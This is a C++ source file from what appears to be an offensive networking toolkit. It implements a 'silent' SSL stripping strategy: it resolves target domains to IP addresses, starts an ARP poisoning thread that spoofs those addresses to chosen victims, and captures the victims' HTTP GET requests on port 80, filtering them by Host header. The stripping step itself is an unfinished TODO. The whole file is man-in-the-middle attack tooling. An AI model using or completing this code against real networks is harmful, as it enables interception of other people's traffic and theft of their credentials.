#include "ssl_stripping/silent.h"
#include "HttpLayer.h"
#include "IPv4Layer.h"
#include "IpAddress.h"
#include "Packet.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "RawPacket.h"
#include "TcpLayer.h"
#include "arp_poisoning/public.h"
#include "log.h"
#include "ssl_stripping/public.h"
#include <algorithm>
#include <exception>
#include <future>
#include <stdexcept>
#include <thread>
#include <unordered_set>
#include <vector>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h> // for getaddrinfo, inet_ntop
#pragma comment(lib, "ws2_32.lib")
#else
#include <arpa/inet.h>
#include <cstring>
#include <netdb.h>
#include <unistd.h>

#endif

std::optional<std::unordered_set<std::string>>
resolveDomainToIP(const std::string &domain) {
#ifdef _WIN32
    WSADATA wsaData;
    int wsaerr = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaerr != 0) {
        std::cerr << "WSAStartup failed: " << wsaerr << std::endl;
        return std::nullopt;
    }
#endif

    addrinfo hints{};
    hints.ai_family = AF_UNSPEC; // AF_INET or AF_INET6
    hints.ai_socktype = SOCK_STREAM;

    addrinfo *res = nullptr;
    int status = getaddrinfo(domain.c_str(), nullptr, &hints, &res);
    if (status != 0) {
#ifdef _WIN32
        LOG_ERROR("getaddrinfo: " + std::string(gai_strerrorA(status)));
#else
        LOG_ERROR("getaddrinfo: " + std::string(gai_strerror(status)));
#endif
        return std::nullopt;
    }

    std::cout << "IP addresses for " << domain << ":\n";

    std::unordered_set<std::string> outputIps;
    for (addrinfo *currentAddrInfo = res; currentAddrInfo != nullptr;
         currentAddrInfo = currentAddrInfo->ai_next) {
        std::array<char, INET6_ADDRSTRLEN> ipstr{};

        void *addr = nullptr;
        if (currentAddrInfo->ai_family == AF_INET) { // IPv4
            auto *ipv4 =
                // NOLINTNEXTLINE(cppcoreguidelines-pro-type-reinterpret-cast)
                reinterpret_cast<sockaddr_in *>(currentAddrInfo->ai_addr);
            addr = &(ipv4->sin_addr);
        } else { // IPv6
            auto *ipv6 =
                // NOLINTNEXTLINE(cppcoreguidelines-pro-type-reinterpret-cast)
                reinterpret_cast<sockaddr_in6 *>(currentAddrInfo->ai_addr);
            addr = &(ipv6->sin6_addr);
        }

        inet_ntop(currentAddrInfo->ai_family, addr, ipstr.data(),
                  sizeof(ipstr));
        std::cout << "  " << ipstr.data() << "\n";
        outputIps.insert(ipstr.data());
    }

    freeaddrinfo(res);

#ifdef _WIN32
    WSACleanup();
#endif
    return outputIps;
}

void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
    pcpp::RawPacket *packet, pcpp::PcapLiveDevice * /*device*/,
    void * /*cookie*/) {
    pcpp::Packet parsedPacket(packet);

    // Check IPv4 layer
    auto *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
    if (ipLayer == nullptr) {
        return;
    }

    // Check if destination IP matches some victim IP
    if (std::find(victimIps_.begin(), victimIps_.end(),
                  ipLayer->getDstIPAddress().toString()) == victimIps_.end()) {
        return;
    }

    // Check TCP layer
    auto *tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
    const int HTTP_PORT = 80;
    if ((tcpLayer == nullptr) || tcpLayer->getDstPort() != HTTP_PORT) {
        return;
    }

    // Access HTTP Layer
    auto *httpRequestLayer =
        parsedPacket.getLayerOfType<pcpp::HttpRequestLayer>();
    if (httpRequestLayer == nullptr) {
        return;
    }

    // Check if method is GET
    if (httpRequestLayer->getFirstLine()->getMethod() !=
        pcpp::HttpRequestLayer::HttpGET) {
        return;
    }

    // Check Host header
    pcpp::HeaderField *hostField = httpRequestLayer->getFieldByName("Host");
    if (hostField == nullptr) {
        return;
    }

    // Check whether domain is in Host header and start SSL attack if so
    std::string hostValue = hostField->getFieldValue();
    for (const std::string &domain : domainsToStrip_) {
        if (hostValue.find(domain) != std::string::npos) {
            // TODO(Quinn)
        }
    }
}

void ATK::SSL::SilentSslStrippingStrategy::execute() {
    if (mitmStrategy_ == ATK::SSL::MitmStrategy::ARP) {
        ATK::ARP::SilentPoisoningOptions options;
        options.ifaceIpOrName = device_->getName();
        std::unordered_set<std::string> victimIpsSet(victimIps_.begin(),
                                                     victimIps_.end());
        options.victimIps = victimIpsSet;
        std::unordered_set<std::string> ipsToSpoofSet;
        for (const std::string &domain : domainsToStrip_) {
            std::optional<std::unordered_set<std::string>> currentIps =
                resolveDomainToIP(domain);
            if (currentIps.has_value()) {
                ipsToSpoofSet.insert(currentIps.value().begin(),
                                     currentIps.value().end());
            }
        }
        options.ipsToSpoof = ipsToSpoofSet;

        std::thread(ATK::ARP::silentPoison, options).detach();
    } else {
    }

    if (!device_->open()) {
        throw std::runtime_error("Unable to open interface");
    }

    std::promise<void> completionPromise;
    std::future<void> completionFuture = completionPromise.get_future();

    if (!device_->setFilter("tcp dst port 80")) {
        LOG_ERROR("Cannot set tcp filter");
        device_->close();
        throw std::runtime_error(
            "Unable to set http request filters on interface");
    };

    if (!device_->startCapture(
            [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                   void *cookie) { onPacketArrives(packet, device, cookie); },
            &completionFuture)) {
        device_->close();
        throw std::runtime_error("Unable to start capturing http packets");
    };

    try {
        completionFuture.get();
    } catch (const std::exception &e) {
        device_->close();
    }

    device_->close();
}
